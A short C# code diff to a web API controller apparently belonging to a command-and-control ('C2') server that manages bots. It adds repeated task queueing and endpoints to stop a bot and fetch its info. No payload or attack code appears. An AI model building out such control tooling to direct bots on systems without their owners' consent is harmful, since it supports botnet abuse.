@@ -17,8 +17,36 @@ public class ManagementController : AbstractController
     [ProducesResponseType(StatusCodes.Status200OK)]
     public IActionResult QueueTask([FromBody] AddedBotTask task)
     {
-        C2State.TaskManager.QueueBotTask(task.Task, task.TaskParameters);
+        for (int i = 0; i < task.Count; i++)
+        {
+            C2State.TaskManager.QueueBotTask(task.Task, task.TaskParameters);
+        }
+
         return Ok();
+    }
+
+    [HttpGet("StopBot")]
+    [ProducesResponseType(StatusCodes.Status200OK)]
+    public IActionResult StopBot([FromQuery] int bot_id)
+    {
+        BotClient bot = GetBot(bot_id);
+
+        bot.StopRequested = true;
+
+        return Ok();
+    }
+
+    [HttpGet("GetBotInfo")]
+    [ProducesResponseType(typeof(BotInfoPoco), StatusCodes.Status200OK)]
+    public IActionResult GetBotInfo([FromQuery] int bot_id)
+    {
+        BotClient bot = GetBot(bot_id);
+
+        return Ok(new BotInfoPoco()
+        {
+            Bot = bot,
+            Task = C2State.TaskManager.GetTask(bot.TaskId)
+        });
     }
 
     [HttpGet("GetBotManager")]
